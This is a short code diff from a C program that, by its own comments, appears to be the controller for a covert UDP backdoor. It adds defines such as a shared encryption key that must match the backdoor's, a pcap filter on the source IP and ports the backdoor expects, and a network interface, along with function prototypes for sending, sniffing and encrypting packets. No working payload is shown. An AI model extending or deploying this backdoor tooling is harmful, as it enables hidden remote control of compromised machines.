@@ -11,8 +11,12 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <errno.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <ctype.h>
 
 #define PKT_SIZE		    4096
+#define BUFLEN              1024
 #define DEFAULT_DST_PORT	8080
 #define DEFAULT_SRC_PORT	11234
 #define DEFAULT_TTL		    255
@@ -20,9 +24,9 @@
 #define MAXLINE			    80
 #define DEFAULT_SRC_IP		"192.168.0.5"
 #define OPTIONS 		    "?h:d:s:p:c:"
-#define ENCRYPTION_KEY      "zdehjk"
-#define FILTER              "udp and src host %s and src port %d and dst port %d"
-
+#define ENCRYPTION_KEY      "zdehjk"  //Ensure this is the same as the backdoor key
+#define FILTER              "udp and src host %s and src port %d and dst port %d" //current backdoor looks for specific src_ip, src and dst ports
+#define DEFAULT_INTERFACE   "em1"
 
 // Globals
 typedef struct    //needed for checksum calculation
@@ -55,7 +59,7 @@ typedef struct
 // Function Prototypes
 void send_packet(struct AddrInfo *UserAddr);
 void receive_packet(PcapInfo *pcap_arg);
-void pkt_callback (u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char *packet);
+void pkt_callback (u_char *descr, const struct pcap_pkthdr* pkthdr, const u_char *packet);
 char* encrypt(char *key, char *string);
 void usage (char **arg );
 unsigned short csum (unsigned short *, int);
